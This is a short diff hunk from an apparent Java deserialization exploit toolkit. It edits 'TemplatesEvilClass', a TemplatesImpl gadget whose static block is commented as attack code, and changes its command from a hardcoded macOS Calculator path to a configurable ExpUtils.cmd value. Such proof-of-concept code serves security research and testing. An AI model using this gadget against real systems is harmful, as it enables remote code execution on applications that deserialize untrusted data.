@@ -12,7 +12,7 @@ import java.io.IOException;
 * 供TemplatesImpl 使用的poc代码
 * */
 public class TemplatesEvilClass extends AbstractTranslet {
-    private static final String cmd = "/System/Applications/Calculator.app/Contents/MacOS/Calculator";
+    private static final String cmd = ExpUtils.cmd;
     static {
 //        攻击代码
         System.out.println("static : pwn!");
